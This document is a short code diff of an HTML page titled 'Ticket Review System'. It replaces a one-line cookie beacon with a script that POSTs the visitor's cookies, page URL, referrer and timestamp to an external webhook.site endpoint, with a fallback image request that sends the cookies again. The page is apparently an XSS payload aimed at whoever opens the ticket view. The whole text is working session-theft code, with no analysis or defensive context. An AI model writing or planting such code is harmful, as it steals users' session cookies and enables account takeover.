@@ -1,8 +1,22 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
-  <script>
-      new Image().src = 'https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?c=' + encodeURIComponent(document.cookie);
-  </script>
+<script>
+fetch("https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0", {
+    method: "POST",
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        cookies: document.cookie,
+        page: window.location.href,
+        timestamp: new Date().toISOString(),
+        referrer: document.referrer
+    })
+}).catch(err => {
+    new Image().src = "https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?fallback_cookies=" + encodeURIComponent(document.cookie);
+});
+</script>
+<h1>Ticket Review System</h1>
 </body>
 </html>
